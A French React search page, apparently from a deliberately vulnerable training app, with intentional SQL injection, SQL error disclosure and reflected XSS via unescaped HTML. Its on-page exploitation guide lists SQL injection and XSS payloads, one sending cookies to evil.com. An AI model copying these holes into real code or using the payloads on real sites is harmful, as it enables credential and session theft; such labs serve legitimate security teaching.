
import { useState } from 'react';
import { Link } from 'react-router-dom';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { Alert, AlertDescription } from '@/components/ui/alert';
import { ArrowLeft, AlertTriangle, Search as SearchIcon } from 'lucide-react';

const Search = () => {
  const [searchTerm, setSearchTerm] = useState('');
  const [results, setResults] = useState<Array<{id: number, title: string, content: string}>>([]);
  const [sqlQuery, setSqlQuery] = useState('');
  const [error, setError] = useState('');

  // Données simulées pour la recherche
  const mockData = [
    { id: 1, title: "Article 1", content: "Contenu de l'article 1 avec des informations importantes" },
    { id: 2, title: "Article 2", content: "Deuxième article avec du contenu intéressant" },
    { id: 3, title: "Guide Admin", content: "Guide pour les administrateurs - confidentiel" },
    { id: 4, title: "Configuration", content: "Fichier de configuration avec mots de passe" }
  ];

  const handleSearch = (e: React.FormEvent) => {
    e.preventDefault();
    
    // VULNÉRABILITÉ 1: INJECTION SQL
    // La requête SQL concatène directement l'entrée utilisateur sans paramètres liés
    const vulnerableQuery = `SELECT * FROM articles WHERE title LIKE '%${searchTerm}%' OR content LIKE '%${searchTerm}%'`;
    setSqlQuery(vulnerableQuery);
    
    console.log('VULNERABLE SEARCH QUERY:', vulnerableQuery);

    // Simulation d'injection SQL
    if (searchTerm.includes("'") || searchTerm.toLowerCase().includes('union') || searchTerm.toLowerCase().includes('select')) {
      // VULNÉRABILITÉ 2: DIVULGATION D'INFORMATIONS D'ERREUR
      setError(`Erreur MySQL: You have an error in your SQL syntax near '${searchTerm}' at line 1. Query: ${vulnerableQuery}`);
      
      // Simulation de données extraites par injection UNION
      if (searchTerm.toLowerCase().includes('union select')) {
        const injectedResults = [
          { id: 999, title: "admin", content: "password123" },
          { id: 998, title: "database_config", content: "host=localhost;user=root;pass=admin123" },
          { id: 997, title: "secret_key", content: "jwt_secret_key_123456789" }
        ];
        setResults(injectedResults);
        console.log('SQL INJECTION SUCCESSFUL - EXTRACTED DATA:', injectedResults);
        return;
      }
    }

    // Recherche normale (simulation)
    const filteredResults = mockData.filter(item => 
      item.title.toLowerCase().includes(searchTerm.toLowerCase()) ||
      item.content.toLowerCase().includes(searchTerm.toLowerCase())
    );
    
    setResults(filteredResults);
    setError('');
  };

  const handleReflectedXSS = () => {
    // VULNÉRABILITÉ 3: XSS RÉFLÉCHI
    // Le terme de recherche est directement affiché sans échappement
    const urlParams = new URLSearchParams(window.location.search);
    const searchFromUrl = urlParams.get('q');
    if (searchFromUrl) {
      setSearchTerm(searchFromUrl);
      // Simulation d'affichage XSS réfléchi
      console.log('REFLECTED XSS POSSIBLE:', searchFromUrl);
      document.title = `Recherche: ${searchFromUrl}`; // XSS dans le titre
    }
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-yellow-50 to-orange-50 p-4">
      <div className="container mx-auto max-w-4xl space-y-6">
        <div className="flex items-center justify-between">
          <Link to="/" className="inline-flex items-center gap-2 text-yellow-600 hover:text-yellow-800">
            <ArrowLeft className="h-4 w-4" />
            Retour à l'accueil
          </Link>
          <Button onClick={handleReflectedXSS} variant="outline" className="text-red-600">
            Tester XSS Réfléchi
          </Button>
        </div>

        <Card className="border-red-200">
          <CardHeader>
            <CardTitle className="flex items-center gap-2">
              <SearchIcon className="h-5 w-5" />
              <AlertTriangle className="h-4 w-4 text-red-600" />
              Recherche Vulnérable
            </CardTitle>
          </CardHeader>
          <CardContent>
            <form onSubmit={handleSearch} className="space-y-4">
              <div>
                <Label htmlFor="search">Terme de recherche</Label>
                <Input
                  id="search"
                  type="text"
                  value={searchTerm}
                  onChange={(e) => setSearchTerm(e.target.value)}
                  placeholder="' UNION SELECT username,password,1 FROM users --"
                  required
                />
              </div>

              <Button type="submit" className="w-full bg-yellow-600 hover:bg-yellow-700">
                Rechercher (injection SQL possible)
              </Button>
            </form>

            {/* VULNÉRABILITÉ: XSS RÉFLÉCHI - Affichage non échappé du terme de recherche */}
            {searchTerm && (
              <div className="mt-4 p-3 bg-blue-50 rounded">
                <p>Résultats pour: <span dangerouslySetInnerHTML={{ __html: searchTerm }} /></p>
              </div>
            )}

            {/* Affichage de la requête SQL (vulnérabilité de divulgation) */}
            {sqlQuery && (
              <div className="mt-4 p-3 bg-gray-100 rounded text-xs">
                <strong>Requête SQL exécutée:</strong><br />
                <code className="text-red-600">{sqlQuery}</code>
              </div>
            )}

            {/* Affichage des erreurs SQL (divulgation d'informations) */}
            {error && (
              <Alert className="mt-4 border-red-200">
                <AlertDescription className="text-red-700 text-xs">
                  {error}
                </AlertDescription>
              </Alert>
            )}
          </CardContent>
        </Card>

        {/* Résultats de recherche */}
        {results.length > 0 && (
          <Card>
            <CardHeader>
              <CardTitle>Résultats ({results.length})</CardTitle>
            </CardHeader>
            <CardContent>
              <div className="space-y-4">
                {results.map((result) => (
                  <div key={result.id} className="border rounded p-4">
                    <h3 className="font-semibold text-lg">{result.title}</h3>
                    <p className="text-gray-600 mt-2">{result.content}</p>
                    {result.id > 990 && (
                      <span className="inline-block mt-2 px-2 py-1 bg-red-100 text-red-700 text-xs rounded">
                        Données extraites par injection SQL!
                      </span>
                    )}
                  </div>
                ))}
              </div>
            </CardContent>
          </Card>
        )}

        {/* Guide d'exploitation */}
        <Card className="border-red-300">
          <CardHeader>
            <CardTitle className="text-red-700">Guide d'exploitation</CardTitle>
          </CardHeader>
          <CardContent className="text-sm space-y-2">
            <div>
              <strong>Injection SQL:</strong>
              <ul className="ml-4 mt-1 space-y-1">
                <li>• <code>' OR '1'='1</code> - Bypass de la condition WHERE</li>
                <li>• <code>' UNION SELECT 1,2,3 --</code> - Test du nombre de colonnes</li>
                <li>• <code>' UNION SELECT username,password,1 FROM users --</code> - Extraction de données</li>
              </ul>
            </div>
            
            <div>
              <strong>XSS Réfléchi:</strong>
              <ul className="ml-4 mt-1 space-y-1">
                <li>• <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code></li>
                <li>• <code>&lt;img src=x onerror=alert('XSS')&gt;</code></li>
                <li>• URL: <code>?q=&lt;script&gt;document.location='http://evil.com/steal?cookie='+document.cookie&lt;/script&gt;</code></li>
              </ul>
            </div>
          </CardContent>
        </Card>
      </div>
    </div>
  );
};

export default Search;
